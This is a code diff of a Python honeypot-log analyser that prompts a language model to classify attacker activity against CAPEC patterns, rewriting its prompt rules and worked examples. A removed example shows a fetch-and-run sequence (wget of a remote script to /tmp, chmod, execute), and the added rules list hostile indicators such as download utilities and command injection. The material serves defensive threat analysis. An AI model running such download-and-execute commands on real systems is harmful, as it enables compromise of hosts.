@@ -368,7 +368,7 @@ def generate_llm_input(log_entry_or_session: Union[Dict, List[Dict]], honeypot_t
             sip_methods.add(str(entry.get('sip_method', 'UNKNOWN')).upper())
             user_agents.add(str(entry.get('sip_user_agent', 'NOT_FOUND')))
             if pd.notna(entry.get('called_number')): called_numbers.append(str(entry.get('called_number')))
-        
+
         unique_numbers = list(dict.fromkeys(called_numbers))
         methods_str = ", ".join(sorted(list(sip_methods)))
         desc_parts.append(f"Observed {total_events} SIP interaction(s) from a single source IP, using method(s): {methods_str}.")
@@ -551,14 +551,14 @@ class HybridAnalyzer:
     def analyze(self, llm_input_description: str, honeypot_type: str, db_manager: VectorDBManager, top_k: int = 5) -> Dict[str, Any]:
         llm_analysis = _generate_llm_analysis(llm_input_description, honeypot_type)
         query_text = self._get_query_text_from_llm(llm_analysis)
-        
+
         result_dict = {
-            'llm_input_description': llm_input_description, 
-            'llm_analysis': llm_analysis, 
-            'db_matches': [], 
+            'llm_input_description': llm_input_description,
+            'llm_analysis': llm_analysis,
+            'db_matches': [],
             'debug_candidates': []
         }
-        
+
         if not query_text: return result_dict
 
         # --- FASE 1: OTTENERE LE LISTE ORDINATE SEPARATAMENTE ---
@@ -567,7 +567,7 @@ class HybridAnalyzer:
         # Ricerca Semantica
         query_embedding = self.embedder.encode(query_text, normalize_embeddings=True)
         semantic_results = db_manager.collection.query(
-            query_embeddings=[query_embedding.tolist()], 
+            query_embeddings=[query_embedding.tolist()],
             n_results=CANDIDATE_COUNT
         )
         semantic_ids = semantic_results.get('ids', [[]])[0]
@@ -579,7 +579,7 @@ class HybridAnalyzer:
         keyword_rank_map = {doc_id: i + 1 for i, doc_id in enumerate(sorted_keyword_ids)}
 
         all_candidate_ids = set(semantic_ids) | set(sorted_keyword_ids[:CANDIDATE_COUNT])
-        
+
         if not all_candidate_ids: return result_dict
 
         # --- FASE 2: APPLICARE RECIPROCAL RANK FUSION (RRF) ---
@@ -617,146 +617,161 @@ class HybridAnalyzer:
 
 def _get_llm_prompt(event_input_description: str, honeypot_type: str) -> str:
     base_template = """<s>[INST]
-<Role>
-You are an expert Threat Intelligence Analyst. Your mission is to analyze low-level honeypot logs and abstract them into a high-level Tactic, Technique, and Procedure (TTP) suitable for mapping against a standardized knowledge base like CAPEC or MITRE ATT&CK.
-</Role>
+### Your Role: Threat Intelligence Lexicographer
+You are an AI tasked with defining cybersecurity attack patterns for a formal knowledge base like CAPEC. Your role is **not to narrate a specific event**, but to provide a formal, abstract, and encyclopedic **DEFINITION** of a single attack technique, demonstrating deep contextual understanding.
 
-<Instructions>
-1.  **Analyze the Log Data**: Review the 'Event Description', focusing on 'Specific observations' for critical details.
+### Core Mission: Identify the Apex Threat and Define It
+1.  **Identify the Apex Threat**: From the input log, identify the single most severe and significant action (e.g., Remote Code Execution, Application Fingerprinting, Credential Brute-Forcing). This is the *only* technique you will define.
+2.  **Define the Technique**: Write a formal, general-purpose definition of that technique.
 
-2.  **Internal Chain of Thought (Crucial for Abstraction)**: Before generating the JSON, perform this internal reasoning process:
-    a. **Deconstruct Actions**: Break down the observed activity into distinct phases: Reconnaissance/Exploration (e.g., scanning, probing), Staging/Experimentation (e.g., downloading tools, testing commands), and Action/Exploit (e.g., executing payload, exfiltrating data).
-    b. **Infer Primary Objective**: Based on the most significant action, determine the attacker's primary, high-level goal (e.g., 'Gain Initial Access', 'Execute Code', 'Discover System Information', 'Exfiltrate Data'). This is the core abstract concept.
-    c. **Identify Specific Techniques**: List the concrete methods used (e.g., 'Port Scanning', 'SQL Injection', 'Payload Delivery via Wget', 'Credential Stuffing').
-    d. **Synthesize a Formal Description**: Combine the objective and techniques into a formal, generalized narrative, explaining the "what," "why," and "how" of the attack pattern.
+### Chain-of-Thought Process
+You MUST follow this internal reasoning process for ALL tasks:
+1.  **Evidence Ingestion**: List all actions and inputs explicitly mentioned in the log.
+2.  **Input Validity Check**: Critically evaluate if inputs are contextually valid for their actions.
+3.  **Intent Inference**: Determine the *true intent* of each action. An action labeled 'failed login' with an invalid username is not 'Credential Access', it is 'Reconnaissance'.
+4.  **Apex Threat Identification**: Using the `Threat Hierarchy` and `Context-Specific Rules`, identify the single action with the most severe *true intent*.
+5.  **Contextual Coherence Check**: Ask: "Is the inferred intent logically possible given the context?" (e.g., 'Privilege Escalation' is impossible if the user is already 'root'). Correct your analysis if it's illogical.
+6.  **Abstraction & Definition**: Formulate a completely abstract definition of the *corrected* Apex Threat.
 
-3.  **Generate JSON Output**: Create a single, valid JSON object based on your abstract analysis.
-</Instructions>
+### Threat Hierarchy (Highest to Lowest Priority)
+1.  **Execution**: Any form of code or command execution.
+2.  **Credential Access**: Attempts to use, steal, or guess credentials.
+3.  **Reconnaissance & Discovery**: All other information gathering activities.
 
-<OutputFormat>
-The JSON object must contain these four keys exclusively:
-- "pattern_name": A formal name for the TTP. **Structure it as 'Broad Category: Specific Technique'**. Use abstract categories like 'Reconnaissance', 'Initial Access', 'Execution', 'Credential Access', 'Discovery'. For example: "Reconnaissance: VoIP Dial Plan Enumeration" or "Execution: Malware Delivery via Wget".
-- "detailed_description": A formal, abstract explanation of the generalized attack pattern, suitable for a knowledge base. Explain the attacker's objective and the sequence of techniques. AVOID simply repeating the log data; INTERPRET and GENERALIZE it.
-- "technical_keywords": A list of 8-10 highly specific technical keywords and short phrases. **Include abstract concepts and techniques** (e.g., 'Privilege Escalation', 'Service Discovery') alongside concrete tools/commands (e.g., 'wget', 'nmap -sS'). **Crucially, AVOID generic terms** like 'attack', 'system', 'server', 'log', 'data', 'user'.
-- "justification": A single sentence explaining which specific log evidence was most critical for your analysis.
+### Critical Rules
+-   **RULE 1 (EVIDENCE-BOUND REASONING)**: You MUST NOT infer actions not present in the log. If the log only shows `GET` requests, you cannot infer a `Brute Force` attack.
+-   **RULE 2 (DO NOT SUMMARIZE)**: Your `detailed_description` MUST be a formal DEFINITION of the technique, not a summary of the log's events.
+-   **RULE 3 (STRICT ABSTRACTION)**: The `detailed_description` and `technical_keywords` MUST NOT contain any specific details from the logs (commands, filenames, tools, etc.).
+-   **RULE 4 (LOGICAL COHERENCE)**: Your analysis must be logically consistent. DO NOT classify an action with an intent that is already fulfilled. For example, **DO NOT classify an action as 'Privilege Escalation' if the user already has root/administrator privileges.**
 
-**Crucial rule**: The final output MUST be ONLY the JSON object, starting with `{{` and ending with `}}`.
-</OutputFormat>
+### Output JSON Structure
+Your output must be ONLY a single valid JSON object with these four keys:
+-   `"pattern_name"`: Formal name as 'Broad Category: Specific Technique'.
+-   `"detailed_description"`: The formal, abstract, textbook-style definition of the Apex Threat.
+-   `"technical_keywords"`: A list of 8-10 abstract concepts related to the technique.
+-   `"justification"`: The ONLY field where you must cite the specific evidence for the Apex Threat.
 """
 
     context_str, example_str = "", ""
 
     if honeypot_type == 'Cowrie':
-        context_str = """<HoneypotContext>
-This event is from a **Cowrie** honeypot. Analyze command sequences and file movements to determine the TTP.
-</HoneypotContext>"""
+        context_str = """
+### Honeypot Context: Cowrie
+-   **Input Type**: Interactive SSH/Telnet session logs.
+-   **Context-Specific Rules**:
+    1.  The execution of any script or binary (`sh`, `bash`, `./filename`) or the use of a download utility (`wget`, `curl`) is ALWAYS the Apex Threat (Execution).
+    2.  If no execution occurs, a sequence of commands for system enumeration (`ifconfig`, `uname`, `ps`, `cat /proc/...`) is the Apex Threat (Reconnaissance).
+    3.  A failed login with a non-human-readable username (e.g., an HTTP request) is `Application Fingerprinting`, NOT `Brute Force`."""
         example_str = """
-<Example>
-<InputLog>
-Interactive SSH session. Login succeeded as user 'root'. Commands executed. File download activity recorded. Specific observations: Command Summary: {{"Initial Commands": ["sh"], "Noteworthy Commands": ["wget http://1.2.3.4/p.sh -O /tmp/p.sh"], "Final Commands": ["chmod +x /tmp/p.sh", "/tmp/p.sh"]}}. Download Details: ["Downloaded from 'http://1.2.3.4/p.sh' to '/tmp/p.sh'"].
-</InputLog>
-<OutputJSON>
+
+### Example
+**Input Log:**
+`Interactive SSH session. Login succeeded as 'pi'. Commands: ["uname -r", "ifconfig", "ps aux"].`
+**Output JSON:**
+```json
 {{
-  "pattern_name": "Execution: Remote Payload Delivery and Execution",
-  "detailed_description": "An adversary, having gained access to a shell, utilizes a common utility like 'wget' to download a script from an external server. The script is then made executable and run on the target system. This pattern represents a common technique for establishing a foothold or deploying second-stage malware on a compromised host.",
-  "technical_keywords": ["execution", "payload delivery", "wget", "command and control", "malware staging", "chmod", "remote code execution", "foothold establishment"],
-  "justification": "The sequence of 'wget' to download a script, followed by 'chmod' to make it executable and its subsequent execution, is the key evidence for this pattern."
+  "pattern_name": "Reconnaissance: System Information Gathering",
+  "detailed_description": "System Information Gathering is a technique where an adversary executes a series of built-in commands to obtain detailed information about a host's configuration. This can include discovering the operating system version, network interfaces, and running processes. This activity allows the adversary to map the system's environment to plan subsequent actions.",
+  "technical_keywords": ["reconnaissance", "discovery", "system information gathering", "os fingerprinting", "network configuration discovery", "process discovery", "host enumeration", "post-exploitation"],
+  "justification": "The sequence of commands including 'uname -r', 'ifconfig', and 'ps aux' is the definitive evidence of a system information gathering technique."
 }}
-</OutputJSON>
-</Example>"""
+```"""
 
     elif honeypot_type == 'Honeytrap':
-        context_str = """<HoneypotContext>
-This is a summary of all activity from a single IP, captured by a **Honeytrap** honeypot (network connection capture). The input describes the total number of connections, the ports targeted, and key details about any data payloads exchanged.
-Your goal is to infer the attacker's overall TTP.
-- If the summary shows many connections to various ports with **no data exchanged**, the TTP is **Port Scanning** or **Service Discovery**.
-- If data payloads are present, analyze the **'Inferred Payload Types'** (e.g., 'TLS Handshake', 'HTTP Request') and the **'Example Payloads'** to determine the primary intent. This is the most crucial evidence. A TLS handshake on a non-standard port is a strong indicator of scanning for secure services.
-</HoneypotContext>"""
+        context_str = """
+### Honeypot Context: Honeytrap
+-   **Input Type**: Network connection summary.
+-   **Context-Specific Rules**:
+    1.  A payload containing shell commands (`rm`, `wget`, etc.) within a URL is ALWAYS the Apex Threat (Execution: Command Injection).
+    2.  If no command injection is present, a payload that is a valid HTTP request targeting a known vulnerability path (e.g., `/.env`, `/setup.cgi`) is the Apex Threat (Reconnaissance: Vulnerability Probing).
+    3.  Payloads identified as TLS Handshakes or simple HTTP requests to `/` are basic `Service Discovery` (Reconnaissance)."""
         example_str = """
-<Example>
-<InputLog>
-Observed 25 TCP connection attempts from a single source IP, targeting 3 distinct port(s): destination port 443, destination port 8443, destination port 9001. Out of these, 3 connection(s) contained data payloads. Specific observations: Inferred Payload Types: ["TLS Handshake"]. Example Payloads: ["Unintelligible binary data (517 bytes)"].
-</InputLog>
-<OutputJSON>
+
+### Example
+**Input Log:**
+`Observed 10 TCP attempts. 1 had a payload. Example Payloads: ["GET /.env HTTP/1.1"]`
+**Output JSON:**
+```json
 {{
-  "pattern_name": "Reconnaissance: Encrypted Service Discovery",
-  "detailed_description": "The adversary performs a targeted scan against multiple ports to identify and fingerprint encrypted services. The primary technique involves initiating a TLS handshake (Client Hello) to determine if services like HTTPS are running, particularly on non-standard ports. This is a common reconnaissance method to map the secure attack surface of a target.",
-  "technical_keywords": ["reconnaissance", "service discovery", "port scanning", "tls handshake", "ssl scan", "fingerprinting", "port 443", "port 8443"],
-  "justification": "The repeated initiation of a 'TLS Handshake' across multiple ports is the key evidence for an encrypted service discovery scan."
+  "pattern_name": "Reconnaissance: Sensitive File Discovery",
+  "detailed_description": "Sensitive File Discovery is a reconnaissance technique where an adversary sends HTTP requests to probe for well-known configuration or environment files that may contain credentials, API keys, or other sensitive data. This automated activity targets common file paths to identify misconfigurations and gather information for further exploitation.",
+  "technical_keywords": ["reconnaissance", "information gathering", "sensitive data exposure", "configuration file access", "http get", "vulnerability scanning", "web application mapping", "path traversal"],
+  "justification": "The GET request targeting the '/.env' file, a common location for sensitive environment variables, is the key evidence of this technique."
 }}
-</OutputJSON>
-</Example>"""
+```"""
     
     elif honeypot_type == 'Dionaea':
-        context_str = """<HoneypotContext>
-This summary details all interactions from a single source IP with a **Dionaea** honeypot, which emulates various services. The input describes the total number of connections and lists all unique services targeted.
-Your goal is to identify the overall TTP.
-- If the summary only shows connection attempts to various ports without further interaction (like credential captures or FTP commands), the TTP is likely **Service Discovery** or **Port Scanning**.
-- If the summary includes a specific, significant interaction (e.g., capturing a username, a sequence of FTP commands), that interaction is the **primary evidence**. The scanning activity is secondary reconnaissance.
-**Prioritize significant interactions** over simple connection attempts. The most severe action defines the entire pattern.
-</HoneypotContext>"""
+        context_str = """
+### Honeypot Context: Dionaea
+-   **Input Type**: Emulated service interaction summary.
+-   **Context-Specific Rules**:
+    1.  The capture of specific credentials for a high-value service (e.g., 'sa' for mssql, 'root' for mysql) is ALWAYS the Apex Threat (Credential Access).
+    2.  An FTP command sequence that involves more than just login (e.g., `LIST`, `STOR`, `RETR`) is the next most severe threat (Reconnaissance or Execution).
+    3.  Simple connection attempts across multiple ports are `Service Discovery` (Reconnaissance)."""
         example_str = """
-<Example>
-<InputLog>
-Observed 15 connection attempts from a single source IP, targeting 2 distinct service(s): 'mssqld' on destination port 1433, 'smbd' on destination port 445. Specific observations: Credentials were captured during interactions. Summary: ["service: mssqld, user: 'sa'"].
-</InputLog>
-<OutputJSON>
+
+### Example
+**Input Log:**
+`Observed 15 connection attempts targeting 'mssqld' and 'smbd'. Credentials were captured. Summary: ["service: mssqld, user: 'sa'"].`
+**Output JSON:**
+```json
 {{
-  "pattern_name": "Credential Access: MSSQL Authentication Probing",
-  "detailed_description": "The adversary conducts reconnaissance by scanning multiple services, including SMB and MSSQL. Upon discovering an active MSSQL service, they attempt to authenticate using common default credentials, such as the 'sa' username. This TTP combines broad service discovery with a targeted credential attack on a high-value database service.",
-  "technical_keywords": ["credential access", "brute-force", "service discovery", "mssqld", "port 1433", "credential stuffing", "sa username", "reconnaissance"],
+  "pattern_name": "Credential Access: Database Authentication Probing",
+  "detailed_description": "Database Authentication Probing is a form of credential stuffing where an adversary attempts to gain unauthorized access to a database service. The technique involves authenticating with common, default, or previously compromised administrative credentials. This action is distinct from simple service discovery, as it represents a direct attempt to compromise an account on a high-value target.",
+  "technical_keywords": ["credential access", "brute-force", "service discovery", "database security", "authentication bypass", "credential stuffing", "default credentials", "reconnaissance"],
   "justification": "The capture of the 'sa' username for the mssqld service was the key evidence that elevated this activity from a simple scan to a targeted credential attack."
 }}
-</OutputJSON>
-</Example>"""
+```"""
         
     elif honeypot_type == 'Sentrypeer':
-        context_str = """<HoneypotContext>
-This is a summary of all activity from a single IP captured by a **SentryPeer** honeypot (SIP/VoIP). The input describes the SIP methods, User-Agents, and provides examples of the target numbers/extensions.
-Your main goal is to analyze the **pattern of the 'Target numbers/extensions'** to infer the attacker's TTP.
-- A request with `Method: OPTIONS` and a `User-Agent: 'friendly-scanner'` is almost always **SIP Endpoint Discovery**.
-- A series of requests with `Method: INVITE` targeting **sequential or common numbers** (e.g., '100', '101', '1000') is a strong indicator of **SIP Extension Enumeration** or **VoIP War Dialing**.
-- A request with `Method: INVITE` targeting a long number in an international format may indicate a **Toll Fraud** attempt.
-- A `Method: REGISTER` indicates an attempt to register an endpoint, likely for Toll Fraud or to establish a foothold.
-</HoneypotContext>"""
+        context_str = """
+### Honeypot Context: Sentrypeer
+-   **Input Type**: SIP/VoIP interaction summary.
+-   **Context-Specific Rules**:
+    1.  A `REGISTER` request is ALWAYS the Apex Threat (Credential Access: Registration Hijacking).
+    2.  A high volume of `INVITE` requests with sequential or patterned numbers is the Apex Threat (Reconnaissance: Dial Plan Enumeration).
+    3.  A single `INVITE` to an international number is a potential `Toll Fraud` attempt (Execution).
+    4.  `OPTIONS` requests, even with known scanner UAs, are the lowest priority threat (Reconnaissance: Endpoint Discovery)."""
         example_str = """
-<Example>
-<InputLog>
-Observed 25 SIP interaction(s) from a single source IP, using method(s): INVITE. Specific observations: User-Agent(s) observed: ["Linksys/SPA942"]. Target numbers/extensions observed (examples): ["958011...", "9589011...", "959011...", "9599011...", "960011..."] (Sequential numbers detected, indicates dial plan scanning).
-</InputLog>
-<OutputJSON>
+
+### Example
+**Input Log:**
+`Observed 2 SIP interaction(s), using method(s): REGISTER. User-Agent(s) observed: ["friendly-scanner"]. Target numbers/extensions observed: ["1000"].`
+**Output JSON:**
+```json
 {{
-  "pattern_name": "Reconnaissance: VoIP Dial Plan Enumeration (War Dialing)",
-  "detailed_description": "The adversary systematically sends a large number of SIP INVITE requests to enumerate the target's VoIP dial plan. The use of sequential target numbers confirms that this is an automated attempt to discover all valid extensions or phone numbers on the PBX. This reconnaissance is a precursor to more targeted attacks like toll fraud or vishing.",
-  "technical_keywords": ["reconnaissance", "sip", "voip", "invite", "war dialing", "dial plan enumeration", "extension scanning", "linksys"],
-  "justification": "The key evidence was the high volume of INVITE requests targeting a clear sequence of numbers, which is the classic signature of a war dialing tool."
+  "pattern_name": "Credential Access: SIP Registration Hijacking Attempt",
+  "detailed_description": "SIP Registration Hijacking is a credential access technique where an adversary attempts to register a user agent to a SIP registrar on behalf of a legitimate user. By sending crafted REGISTER requests, the attacker aims to associate their own location with the victim's SIP address, allowing them to intercept incoming calls or make fraudulent calls. This is a direct attempt to compromise an account.",
+  "technical_keywords": ["credential access", "sip protocol", "voip security", "registration hijacking", "account takeover", "man-in-the-middle", "authentication bypass", "session initiation"],
+  "justification": "The use of the SIP 'REGISTER' method is the key evidence, as its primary purpose is to authenticate and register an endpoint, making it an Apex Threat over simple discovery."
 }}
-</OutputJSON>
-</Example>"""
+```"""
         
     elif honeypot_type == 'Ciscoasa':
-        context_str = """<HoneypotContext>
-This event is from a **Cisco ASA** honeypot that emulates a web server. Your primary task is to analyze the **HTTP Request Sequence**. The attacker's objective is revealed by the specific URL paths they are probing.
-- Pay close attention to paths that indicate scanning for **specific known vulnerabilities** (e.g., ` /+CSCOE+/`, `/_ignition/execute-solution`, `/vendor/phpunit/`).
-- These specific, unusual paths are the **most important evidence** and are more significant than generic requests like `GET /` or `GET /favicon.ico`.
-</HoneypotContext>"""
+        context_str = """
+### Honeypot Context: Ciscoasa
+-   **Input Type**: HTTP request sequence summary.
+-   **Context-Specific Rules**:
+    1.  A request targeting a known, specific vulnerability or administrative path (e.g., '/+CSCOE+/', '/remote/logincheck') is ALWAYS the Apex Threat (Reconnaissance: Specific Service Discovery).
+    2.  DO NOT infer a Brute Force attack from a single `GET` request to a login path. This is Reconnaissance. Brute Force can only be inferred from a high volume of `POST` requests.
+    3.  Generic requests (`GET /`) are the lowest priority."""
         example_str = """
-<Example>
-<InputLog>
-Interaction detected with an emulated Cisco ASA device. 3 unique HTTP request(s) were observed. Specific observations:HTTP Request Sequence: ["GET /", "GET /+CSCOE+/logon.html", "GET /+CSCOE+/win.js"].
-</InputLog>
-<OutputJSON>
+
+### Example
+**Input Log:**
+`2 unique HTTP request(s) were observed. HTTP Request Sequence: ["GET /", "GET /.git/config"]`
+**Output JSON:**
+```json
 {{
-  "pattern_name": "Reconnaissance: Cisco ASA VPN Service Discovery",
-  "detailed_description": "The attacker sent a sequence of HTTP requests targeting specific URL paths associated with the Cisco AnyConnect SSL VPN service, such as '/+CSCOE+/logon.html'. This indicates a reconnaissance attempt to identify if a Cisco ASA VPN gateway is present and accessible, likely as a precursor to vulnerability scanning.",
-  "technical_keywords": ["reconnaissance", "cisco asa", "vpn discovery", "anyconnect", "vulnerability scanning", "http get", "/+cscoe+/"],
-  "justification": "The sequence of requests targeting the '/+CSCOE+/' directory is the key indicator of a Cisco AnyConnect VPN discovery attempt."
+  "pattern_name": "Reconnaissance: Sensitive File Discovery via Web Path",
+  "detailed_description": "Sensitive File Discovery is a reconnaissance technique where an adversary sends HTTP requests to probe for well-known files that contain sensitive system or application data. Targeting common paths like version control system directories (e.g., '/.git/') can expose source code, configuration details, or credentials, providing valuable information for further exploitation.",
+  "technical_keywords": ["reconnaissance", "information gathering", "sensitive data exposure", "version control system", "http get", "vulnerability scanning", "web application mapping", "source code disclosure"],
+  "justification": "The GET request targeting the '/.git/config' file is the key evidence of an attempt to access sensitive configuration data."
 }}
-</OutputJSON>
-</Example>"""
+```"""
     
     else:
-        context_str = f"<HoneypotContext>This event is from an unknown honeypot type: **{honeypot_type}**. Analyze the generic description to infer the attacker's intent.</HoneypotContext>"
+        context_str = ""
         example_str = ""
     
     final_prompt_template = (
@@ -764,16 +779,17 @@ Interaction detected with an emulated Cisco ASA device. 3 unique HTTP request(s)
         context_str + 
         example_str +
         """
-<Task>
-Now, analyze the following real log data.
 
-<InputLog>
-{event_input_description}
-</InputLog>
+Now, analyze the following real log data, strictly adhering to all general and context-specific rules.
 
-<OutputJSON>
+**Input Log:**
+`{event_input_description}`
+
+**Output JSON:**
+```json
 [/INST]
-""")
+"""
+    )
     
     return final_prompt_template.format(event_input_description=event_input_description)
 
@@ -788,7 +804,7 @@ def _generate_llm_analysis(event_input_description: str, honeypot_type: str) -> 
     prompt = _get_llm_prompt(event_input_description, honeypot_type)
 
     try:
-        response = llm_pipeline(prompt, max_new_tokens=500, temperature=0.2, top_p=0.9, do_sample=True, repetition_penalty=1.1,
+        response = llm_pipeline(prompt, max_new_tokens=1500, temperature=0.1, top_p=0.9, do_sample=True, repetition_penalty=1.1,
                                  pad_token_id=tokenizer.eos_token_id, eos_token_id=tokenizer.eos_token_id)[0]['generated_text']
         return _parse_llm_response(response)
     except Exception as e:
@@ -888,10 +904,10 @@ def print_analysis_result(result: Dict, honeypot_type: str, identifier: str, top
         print("  \033[1;31mNessun pattern CAPEC correlato trovato con una confidenza sufficiente.\033[0m")
     else:
         max_score = db_matches[0]['confidence'] if db_matches else 1.0
-        
+
         for i, match in enumerate(db_matches):
             relative_confidence = (match.get('confidence', 0.0) / max_score) if max_score > 0 else 0.0
-            
+
             if relative_confidence > 0.90: confidence_color = "\033[1;32m"
             elif relative_confidence > 0.75: confidence_color = "\033[1;33m"
             else: confidence_color = "\033[0;37m"
@@ -899,7 +915,7 @@ def print_analysis_result(result: Dict, honeypot_type: str, identifier: str, top
             print(f"\n  \033[1m({i + 1}) CAPEC-{match.get('capec_id', 'N/A')}:\033[0m \033[1;37m{match.get('pattern', 'N/A')}\033[0m")
             print(f"     {confidence_color}Confidenza Relativa: {relative_confidence:.2%}\033[0m")
             print(f"     \033[90mDettaglio Ranghi -> Semantico: #{match.get('semantic_rank', 'N/A')}, Keyword: #{match.get('keyword_rank', 'N/A')}\033[0m")
-            
+
             desc = match.get('metadata', {}).get('description', 'N/A')
             print(f"     \033[1mDescrizione CAPEC:\033[0m \033[37m{desc[:200]}...\033[0m")
 
@@ -923,12 +939,12 @@ def print_analysis_result(result: Dict, honeypot_type: str, identifier: str, top
 
 if __name__ == "__main__":
     TOP_K_RESULTS = 5
-    
+
     if not os.path.exists(HONEYPOT_CSV_FILE):
         print(f"\033[1;31m[ERRORE] File CSV '{HONEYPOT_CSV_FILE}' non trovato.\033[0m"); exit()
 
     analyzer, db_manager = initialize_system()
-    
+
     print(f"\n\033[1;44m--- INIZIO ELABORAZIONE DATI --- \033[0m")
     try:
         df = pd.read_csv(HONEYPOT_CSV_FILE, delimiter=';', encoding='utf-8-sig', dtype={'called_number': str}, low_memory=False)
@@ -945,7 +961,7 @@ if __name__ == "__main__":
         allowed_types = ['Cowrie', 'Honeytrap', 'Dionaea', 'Sentrypeer', 'Ciscoasa']
         df_filtered = df[df['type'].isin(allowed_types)].copy()
         print(f"\033[1;33m[DATI] Filtrate per tipi supportati -> {len(df_filtered)} righe.\033[0m")
-        
+
         initial_rows = len(df_filtered)
         noise_patterns = ['Traceback', 'Exception occurred', 'Stopping server', 'Request timed out', 'ssl.SSLEOFError', 'socketserver.py', 'NameError', 'RecursionError']
         if 'message' in df_filtered.columns:
@@ -958,9 +974,9 @@ if __name__ == "__main__":
 
         for col in [c for c in ['dest_port', 'attack_connection.payload.length'] if c in df_filtered.columns]:
             df_filtered[col] = pd.to_numeric(df_filtered[col], errors='coerce').fillna(-1).astype(int)
-        
+
         print(f"\033[1;32m[DATI] Tipi di dati convertiti.\033[0m")
-        
+
     except Exception as e:
         print(f"\033[1;31m[ERRORE] Lettura/Processamento CSV fallito: {e}\033[0m"); traceback.print_exc(); exit()
 
@@ -968,19 +984,19 @@ if __name__ == "__main__":
     initial_rows = len(df_filtered)
     df_filtered.dropna(subset=[c for c in base_required_cols if c in df_filtered.columns], inplace=True)
     print(f"\033[1;33m[DATI] Filtrate per valori essenziali mancanti -> {len(df_filtered)} righe. ({initial_rows - len(df_filtered)} scartate)\033[0m")
-    
+
     if len(df_filtered) == 0: print(f"\033[1;31m[ERRORE] Nessuna riga valida trovata.\033[0m"); exit()
     print(f"\033[1;42m--- ELABORAZIONE DATI COMPLETATA --- \033[0m")
 
     sessions_to_process = defaultdict(list)
-    
+
     if 'session' in df_filtered.columns:
         cowrie_df = df_filtered[(df_filtered['type'] == 'Cowrie') & df_filtered['session'].notna()].copy()
         if not cowrie_df.empty:
             print(f"\n\033[1;36m[RAGGRUPPAMENTO] Raggruppamento di {len(cowrie_df)} righe Cowrie per 'session'...\033[0m")
             for session_id, group in cowrie_df.groupby('session'):
                 sessions_to_process[session_id] = group.sort_values(by='timestamp').to_dict('records')
-    
+
     cisco_df = df_filtered[df_filtered['type'] == 'Ciscoasa'].copy()
     if not cisco_df.empty:
         print(f"\n\033[1;36m[RAGGRUPPAMENTO] Raggruppamento di {len(cisco_df)} righe CiscoASA per 'src_ip'...\033[0m")
@@ -1001,14 +1017,14 @@ if __name__ == "__main__":
         for src_ip, group in honeytrap_df.groupby('src_ip'):
             session_id = f"honeytrap_{src_ip}"
             sessions_to_process[session_id] = group.sort_values(by='timestamp').to_dict('records')
-            
+
     sentrypeer_df = df_filtered[df_filtered['type'] == 'Sentrypeer'].copy()
     if not sentrypeer_df.empty:
         print(f"\n\033[1;36m[RAGGRUPPAMENTO] Raggruppamento di {len(sentrypeer_df)} righe SentryPeer per 'src_ip'...\033[0m")
         for src_ip, group in sentrypeer_df.groupby('src_ip'):
             session_id = f"sentrypeer_{src_ip}"
             sessions_to_process[session_id] = group.sort_values(by='timestamp').to_dict('records')
-            
+
     print(f"\033[1;32m[RAGGRUPPAMENTO] Create {len(sessions_to_process)} sessioni totali da analizzare.\033[0m")
 
     analyzed_count = 0
